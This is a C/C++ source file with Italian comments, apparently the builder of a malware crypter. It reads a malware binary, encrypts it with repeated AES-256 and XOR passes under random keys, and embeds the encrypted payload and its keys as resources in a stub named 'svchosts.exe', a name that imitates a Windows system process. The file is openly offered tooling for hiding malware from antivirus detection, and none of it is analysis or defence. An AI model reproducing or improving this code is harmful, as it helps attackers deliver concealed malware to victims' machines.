#include <stdio.h>
#include <time.h>
#include "encrypt.h"


//array che conterranno i raw byte del malware e dello stub


void getLen(char * path, FILE** file, long* length){
    
    
    *file = fopen(path, "rb");  // Open the file in binary mode
    fseek(*file, 0, SEEK_END);          // Jump to the end of the file
    *length = ftell(*file);          // Get the current byte offset in the file
    rewind(*file);                      // Jump back to the beginning of the file

} 

void writeResource(int code,long length, unsigned char* resource ){
    BOOL result;
    HANDLE hUpdateRes;
    char * stubPath = "svchosts.exe";
    hUpdateRes = BeginUpdateResource(stubPath, FALSE);
    if (hUpdateRes == NULL)
    {
        printf("impossibile aprire lo stub per scrivere le risorse");
        return;
    }
    result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(code), NULL, resource, length);

    if(!result){
        printf("errore nella scrittura della risorsa : %d\n", code);
        return;
    }
    printf("successo nella scrittura della risorsa : %d\n", code);

    return;
 }

int main(int argc, char* argv[]){


    unsigned char* malware;
    char * malwarePath = argv[1];
    FILE* pMalware;
    FILE* pStub;
    long malwareLen;
    long stubLen;
    unsigned char AESkey[32];
    unsigned char XORkey[32];
    int tmp = 1 + rand() % 37;
    int* ROTkey = &tmp;

    srand((unsigned int)time(NULL));

    //genero casualmente la chiave AES di 32 byte
    for(int i = 0; i< 32; i++){
        AESkey[i] = (unsigned char) (rand() % 256);
        //printf("chiave: %x\n", AESkey[i]);
    }
    for(int i = 0; i< 32; i++){
        XORkey[i] = (unsigned char) (rand() % 256);
        //printf("chiave: %x\n", XORkey[i]);
    }
    getLen(malwarePath,&pMalware,&malwareLen);
    
    //Questa routine permette di aprire un file come sequenza di byte, prenderne
    //prendo il path del malware da lina di comando e lo apro in modalita' read-byte 
    // Jump back to the beginning of the file


    malware = new unsigned char[malwareLen];
    fread(malware, malwareLen, 1, pMalware);   // Read in the entire file
    fclose(pMalware);

    //copio i raw bytes dei file malware in un array di unsigned char
    printf(" - Malware acquisito\n");
    

    int nAES = 1 + rand() % 20;
    int nXOR = 1 + rand() % 20;
    for(int i = 0; i< nAES; i++){
        AESEncrypt(malware, malwareLen, (char *)AESkey, sizeof(AESkey)); //cripto in AES-256 il malware
    }
    for(int i = 0; i< nXOR; i++){
        XOR(malware, malwareLen, (char *)XORkey, sizeof(XORkey)); //cripto in AES-256 il malware
    }
    //ROT_encrypt(malware, malwareLen, *ROTkey);
    printf(" - Malware cryptato\n");

    //UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(code), NULL, malware, malwareLen);

    writeResource(69 , malwareLen, malware);
    writeResource(420, sizeof(AESkey), AESkey);
    writeResource(421, sizeof(XORkey),XORkey);
    writeResource(422, sizeof(ROTkey),(unsigned char*)ROTkey);
    writeResource(123, sizeof(nAES),(unsigned char*)&nAES);
    writeResource(124, sizeof(nXOR),(unsigned char*)(&nXOR));
    //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato


    printf("\n\n\nSUCCESSO\n\n\n");
    return 0;
}
